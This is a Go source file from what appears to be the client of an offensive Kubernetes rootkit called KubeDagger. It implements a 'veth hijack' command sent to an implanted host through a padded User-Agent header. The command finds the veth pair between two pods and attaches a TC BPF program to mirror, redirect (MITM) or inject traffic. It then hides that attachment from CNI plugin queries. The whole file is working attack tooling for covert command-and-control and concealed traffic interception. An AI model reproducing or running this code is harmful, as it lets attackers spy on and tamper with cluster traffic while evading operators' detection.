package veth_hijack

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type HijackResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, sourcePod, destPod, mode, output string) error {
	result := &HijackResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"identify_veth_pair",
			"locate veth pair interfaces for source and destination pods",
			"veth_identify_pair",
		},
		{
			"attach_tc_program",
			"attach TC BPF program to veth pair for traffic interception",
			"veth_attach_tc",
		},
		{
			"configure_mode",
			"set hijack mode: mirror (copy traffic), redirect (MITM), or inject (add packets)",
			"veth_set_mode",
		},
		{
			"enable_hijack",
			"activate veth traffic manipulation between pod network namespaces",
			"veth_enable",
		},
		{
			"hide_from_cni",
			"mask TC program attachment from CNI plugin interface queries",
			"veth_hide_cni",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + sourcePod + "#" + destPod + "#" + mode
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/veth_hijack", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
